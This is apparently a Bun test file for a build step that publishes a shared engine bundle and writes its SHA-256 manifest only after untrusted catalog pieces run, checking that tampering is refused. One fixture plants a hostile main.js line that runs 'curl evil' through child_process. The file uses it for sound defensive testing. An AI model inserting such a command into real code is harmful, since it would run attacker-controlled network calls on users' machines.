/**
 * #862: the hosting builder runs every catalog piece at the uid that owns the
 * shared engine artifact. Its manifest (main.js.sha256) must therefore be
 * written only AFTER the pieces ran, from the digest the build computed in
 * memory, and only when nothing in the artifact changed while they ran.
 *
 * `extract` below stands in for the metadata extraction; the hostile ones do
 * what a malicious piece could do at that uid.
 */
import { afterAll, describe, expect, test } from "bun:test";
import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import { closeSync, existsSync, mkdirSync, mkdtempSync, openSync, readdirSync, readFileSync, rmSync, symlinkSync, unlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { ENGINE_MANIFEST_NAME, handOutDigestToFd, publishSharedEngine, writeEngineManifest } from "./shared-engine-publish";

const roots: string[] = [];
afterAll(() => {
  for (const r of roots) rmSync(r, { recursive: true, force: true });
});

const sha = (s: string) => createHash("sha256").update(s).digest("hex");

type Built = { bundleDir: string; digest: string; builtFiles: Record<string, string> };

/**
 * A built bundle dir (main.js, its map and metafile, as buildEngineBundle
 * reports them), plus a stale file the build did not write, and an empty out dir.
 */
function fixture(): { bundle: Built; outDir: string; main: string } {
  const root = mkdtempSync(join(tmpdir(), "jarvis-shared-engine-"));
  roots.push(root);
  const bundleDir = join(root, "bundle");
  mkdirSync(bundleDir);
  const main = "console.log('engine');\n";
  writeFileSync(join(bundleDir, "main.js"), main);
  writeFileSync(join(bundleDir, "main.js.map"), "{}");
  writeFileSync(join(bundleDir, "main.js.meta.json"), "{}");
  // Left by an earlier build, or planted: not one of this build's outputs.
  writeFileSync(join(bundleDir, "stale-preload.js"), "evil");
  mkdirSync(join(bundleDir, "node_modules", "piece-x"), { recursive: true });
  writeFileSync(join(bundleDir, "node_modules", "piece-x", "index.js"), "evil");
  const outDir = join(root, "out", "engine", "hash");
  mkdirSync(outDir, { recursive: true });
  const builtFiles = { "main.js": sha(main), "main.js.map": sha("{}"), "main.js.meta.json": sha("{}") };
  return { bundle: { bundleDir, digest: sha(main), builtFiles }, outDir, main };
}

describe("the shared engine manifest is written after extraction, from the build's digest (#862)", () => {
  test("an untouched artifact gets its manifest after extract, which saw none", async () => {
    const { bundle, outDir, main } = fixture();
    let seenDuringExtract: boolean | undefined;
    const order: string[] = [];
    const { result, engineDigest } = await publishSharedEngine(bundle, outDir, async () => {
      // The pieces run here. The copy is in place, and there is no manifest
      // yet for them to rewrite alongside it.
      order.push("extract");
      expect(readFileSync(join(outDir, "main.js"), "utf8")).toBe(main);
      seenDuringExtract = existsSync(join(outDir, ENGINE_MANIFEST_NAME));
      return "extracted";
    }, (digest) => order.push(`pinned ${digest}`));
    expect(seenDuringExtract).toBe(false);
    // The digest is handed out before any piece runs, and only then.
    expect(order).toEqual([`pinned ${bundle.digest}`, "extract"]);
    expect(result).toBe("extracted");
    expect(engineDigest).toBe(bundle.digest);
    expect(readFileSync(join(outDir, ENGINE_MANIFEST_NAME), "utf8")).toBe(bundle.digest + "\n");
    // Exactly what the build wrote ships: nothing stale or planted beside it.
    expect(readdirSync(outDir).sort()).toEqual(["main.js", "main.js.map", "main.js.meta.json", ENGINE_MANIFEST_NAME]);
  });

  test("a piece that rewrites main.js AND a matching manifest is refused", async () => {
    const { bundle, outDir } = fixture();
    const evil = "require('child_process').exec('curl evil');\n";
    const run = publishSharedEngine(bundle, outDir, async () => {
      writeFileSync(join(outDir, "main.js"), evil);
      writeFileSync(join(outDir, ENGINE_MANIFEST_NAME), sha(evil) + "\n");
    });
    await expect(run).rejects.toThrow(/REFUSED.*main\.js changed.*main\.js\.sha256 added/);
  });

  test("a piece that rewrites main.js alone is refused and no manifest is written", async () => {
    const { bundle, outDir } = fixture();
    await expect(
      publishSharedEngine(bundle, outDir, async () => writeFileSync(join(outDir, "main.js"), "tampered")),
    ).rejects.toThrow("main.js changed");
    expect(existsSync(join(outDir, ENGINE_MANIFEST_NAME))).toBe(false);
  });

  test("a changed sibling, an added file, a removed file or a symlinked main.js is refused", async () => {
    const hostile: Array<[string, (dir: string) => void, RegExp]> = [
      ["sourcemap", (d) => writeFileSync(join(d, "main.js.map"), '{"sources":["x"]}'), /main\.js\.map changed/],
      ["added", (d) => writeFileSync(join(d, "preload.js"), "x"), /preload\.js added/],
      ["removed", (d) => unlinkSync(join(d, "main.js.meta.json")), /main\.js\.meta\.json removed/],
      ["symlink", (d) => {
        const real = resolve(d, "..", "elsewhere.js");
        writeFileSync(real, readFileSync(join(d, "main.js")));
        unlinkSync(join(d, "main.js"));
        symlinkSync(real, join(d, "main.js"));
      }, /not a regular file/],
    ];
    for (const [label, tamper, error] of hostile) {
      const { bundle, outDir } = fixture();
      const run = publishSharedEngine(bundle, outDir, async () => tamper(outDir));
      await expect(run, label).rejects.toThrow(error);
      expect(existsSync(join(outDir, ENGINE_MANIFEST_NAME)), label).toBe(false);
    }
  });

  test("a copy that is not the bytes built, or a build that did not report them, never runs extract or pins", async () => {
    let ran = false;
    const extract = async () => {
      ran = true;
    };
    const pinned: string[] = [];
    const onPinned = (d: string) => pinned.push(d);
    // main.js on disk differs from what the build wrote in memory.
    const wrong = fixture();
    writeFileSync(join(wrong.bundle.bundleDir, "main.js"), "swapped after the build");
    await expect(publishSharedEngine(wrong.bundle, wrong.outDir, extract, onPinned)).rejects.toThrow("does not match the build");
    // A sibling differs: the sourcemap is checked against the build too.
    const map = fixture();
    writeFileSync(join(map.bundle.bundleDir, "main.js.map"), '{"sources":["x"]}');
    await expect(publishSharedEngine(map.bundle, map.outDir, extract, onPinned)).rejects.toThrow("differs: main.js.map");
    const none = fixture();
    await expect(publishSharedEngine({ ...none.bundle, digest: null }, none.outDir, extract, onPinned)).rejects.toThrow("no digest");
    // builtFiles must name the same main.js the digest does.
    const split = fixture();
    await expect(
      publishSharedEngine({ ...split.bundle, builtFiles: { ...split.bundle.builtFiles, "main.js": sha("other") } }, split.outDir, extract, onPinned),
    ).rejects.toThrow("did not say which files it wrote");
    // A file already in the out dir would be in the "before" tree and ship.
    const dirty = fixture();
    writeFileSync(join(dirty.outDir, "stale.js"), "x");
    await expect(publishSharedEngine(dirty.bundle, dirty.outDir, extract, onPinned)).rejects.toThrow("is not empty");
    const unlisted = fixture();
    await expect(
      publishSharedEngine({ bundleDir: unlisted.bundle.bundleDir, digest: unlisted.bundle.digest }, unlisted.outDir, extract, onPinned),
    ).rejects.toThrow("did not say which files it wrote");
    const escaping = fixture();
    await expect(
      publishSharedEngine(
        { ...escaping.bundle, builtFiles: { ...escaping.bundle.builtFiles, "../x": sha("x") } },
        escaping.outDir, extract, onPinned,
      ),
    ).rejects.toThrow("outside its directory");
    expect(ran).toBe(false);
    expect(pinned).toEqual([]);
  });

  test("the manifest is created, never written through an existing name or a symlink", () => {
    const { outDir } = fixture();
    const target = join(outDir, "..", "elsewhere");
    writeFileSync(target, "untouched");
    symlinkSync(target, join(outDir, ENGINE_MANIFEST_NAME));
    expect(() => writeEngineManifest(outDir, sha("x"))).toThrow(/EEXIST/);
    expect(readFileSync(target, "utf8")).toBe("untouched");
    const other = fixture();
    writeFileSync(join(other.outDir, ENGINE_MANIFEST_NAME), "planted\n");
    expect(() => writeEngineManifest(other.outDir, sha("x"))).toThrow(/EEXIST/);
    expect(readFileSync(join(other.outDir, ENGINE_MANIFEST_NAME), "utf8")).toBe("planted\n");
    const fresh = fixture();
    writeEngineManifest(fresh.outDir, sha("x"));
    expect(readFileSync(join(fresh.outDir, ENGINE_MANIFEST_NAME), "utf8")).toBe(sha("x") + "\n");
  });

  test("a manifest the build claims to have written is refused: only this step writes it", async () => {
    const { bundle, outDir } = fixture();
    writeFileSync(join(bundle.bundleDir, ENGINE_MANIFEST_NAME), bundle.digest + "\n");
    const claimed = { ...bundle, builtFiles: { ...bundle.builtFiles, [ENGINE_MANIFEST_NAME]: sha(bundle.digest + "\n") } };
    await expect(publishSharedEngine(claimed, outDir, async () => {})).rejects.toThrow("came with the build");
  });

  test("a manifest sitting unreported in the build's directory is simply not copied", async () => {
    const { bundle, outDir } = fixture();
    writeFileSync(join(bundle.bundleDir, ENGINE_MANIFEST_NAME), sha("forged") + "\n");
    await publishSharedEngine(bundle, outDir, async () => {});
    expect(readFileSync(join(outDir, ENGINE_MANIFEST_NAME), "utf8")).toBe(bundle.digest + "\n");
  });

  test("build-shared-runtime runs every piece inside publishSharedEngine and writes no manifest itself", () => {
    const script = readFileSync(resolve(import.meta.dir, "../../../../scripts/build-shared-runtime.ts"), "utf8");
    const start = script.indexOf("await publishSharedEngine(bundle, engineOutDir, async () => {");
    const end = script.indexOf("\n}, handOutDigest);\n", start);
    expect(start).toBeGreaterThan(0);
    expect(end).toBeGreaterThan(start);
    const inside = script.slice(start, end);
    // Everything that can run piece code: the catalog install, the engine and
    // the extraction.
    for (const step of ["spawnSync(process.execPath, [\"install\"", "new EngineRuntime(", "buildPieceCatalog("]) {
      expect({ step, inside: inside.includes(step) }).toEqual({ step, inside: true });
      expect({ step, count: script.split(step).length - 1 }).toEqual({ step, count: 1 });
    }
    expect(script).not.toContain("main.js.sha256\"");
    expect(script).not.toMatch(/createHash/u);
    // And the summary carries the digest the host should pin to.
    expect(script).toMatch(/\n {4}engineDigest,\n/u);
  });

  // --digest-fd is only sound when the builder is the one build-uid holder of
  // the pipe. The builder spawns first-party children (the staging install,
  // esbuild's service) before it hands the digest out and closes the fd; if
  // Bun let them inherit it, they would be second holders that outlive the
  // close. Pins the runtime behaviour that rules it out (Linux: reads /proc).
  test.skipIf(process.platform !== "linux")("a child the builder spawns does not inherit the fd it was handed", () => {
    const root = mkdtempSync(join(tmpdir(), "jarvis-digest-fd-"));
    roots.push(root);
    const held = join(root, "digest-channel");
    const fd = openSync(held, "w");
    try {
      // The builder's shape: a Bun process that INHERITED fd 3 (no CLOEXEC),
      // spawning children through both APIs the build uses.
      const builder = [
        'const { readlinkSync } = require("node:fs");',
        'const { spawnSync } = require("node:child_process");',
        'const list = "ls -l /proc/self/fd/";',
        "process.stdout.write(JSON.stringify({",
        '  own: readlinkSync("/proc/self/fd/3"),',
        '  node: spawnSync("/bin/sh", ["-c", list], { encoding: "utf8" }).stdout,',
        '  bun: Bun.spawnSync(["/bin/sh", "-c", list]).stdout.toString(),',
        "}));",
      ].join("\n");
      const r = spawnSync(process.execPath, ["--no-env-file", "-e", builder], { stdio: ["ignore", "pipe", "pipe", fd], encoding: "utf8" });
      expect(r.stderr).toBe("");
      const seen = JSON.parse(r.stdout) as { own: string; node: string; bun: string };
      // Control: the builder really holds it, so its absence below is real.
      expect(seen.own).toBe(held);
      expect(seen.node).toContain("/proc/");
      expect(seen.node).not.toContain(held);
      expect(seen.bun).not.toContain(held);
    } finally {
      closeSync(fd);
    }
  });

  test.skipIf(process.platform === "win32")("the digest hand-out writes one line and closes the fd", () => {
    const { outDir } = fixture();
    const path = join(outDir, "..", "digest-channel");
    const fd = openSync(path, "w");
    handOutDigestToFd(fd, sha("x"));
    expect(readFileSync(path, "utf8")).toBe(sha("x") + "\n");
    // Closed: the builder no longer holds it.
    expect(() => closeSync(fd)).toThrow(/EBADF/);
  });
});
